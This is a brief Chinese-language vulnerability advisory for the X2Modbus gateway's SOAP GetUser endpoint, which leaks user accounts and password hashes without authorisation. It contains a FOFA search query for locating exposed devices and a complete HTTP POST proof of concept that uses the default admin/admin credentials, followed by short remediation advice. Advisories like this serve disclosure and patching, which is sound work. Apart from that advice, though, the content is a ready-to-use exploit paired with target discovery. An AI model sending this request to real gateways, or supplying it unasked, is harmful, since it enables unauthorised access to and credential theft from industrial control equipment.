## X2Modbus GetUser 信息泄露漏洞

## 漏洞描述
X2Modbus 网关的 SOAP 接口 `GetUser` 默认为调试用途，可在未授权情况下返回后台账户信息。攻击者可直接提交默认的 `admin/admin` 组合读取系统用户及密码散列，继而登录管理界面。

## 资产测绘
```
fofa: server="SunFull-Webs"
```

## POC
```
POST /soap/GetUser HTTP/1.1
Host: <target>
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:136.0) Gecko/20100101 Firefox/136.0
Content-Type: application/x-www-form-urlencoded
Accept-Encoding: gzip
Content-Length: 56

<GetUser><User Name="admin" Password="admin"/></GetUser>
```
返回的 XML 中会包含 `User` 节点及口令信息。

## 修复建议
- 禁用对外公开的 SOAP 接口或加上鉴权
- 修改默认账户并限制访问源 IP

